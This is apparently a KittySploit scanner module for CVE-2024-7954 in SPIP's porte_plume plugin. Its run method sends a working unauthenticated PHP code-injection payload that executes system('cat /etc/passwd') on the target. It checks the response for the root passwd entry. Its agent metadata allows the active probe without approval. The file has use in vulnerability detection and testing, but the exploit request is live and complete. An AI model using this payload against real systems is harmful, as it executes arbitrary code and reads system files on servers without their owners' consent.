#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The porte_plume plugin used by SPIP before 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SPIP Porte Plume Plugin - Remote Code Execution Detection',
        'description': 'The porte_plume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 is vulnerable to an arbitrary code execution vulnerability. A remote and unauthenticated attacker can execute arbitrary PHP as the SPIP user by sending a crafted HTTP request.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'spip', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html',
            'https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather/',
            'https://vulncheck.com/advisories/spip-porte-plume',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-7954',
            'https://github.com/bigb0x/CVE-2024-7954',
        ],
        'cve': 'CVE-2024-7954',
    }

    def run(self):
        path = '/index.php?action=porte_plume_previsu'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="data=AA_[<img111111>->URL`<?php system('cat /etc/passwd'); ?>`]_BB\n")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('Composed-By: SPIP',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='SPIP Porte Plume Plugin - Remote Code Execution detected', path=path)
            return True
        return False

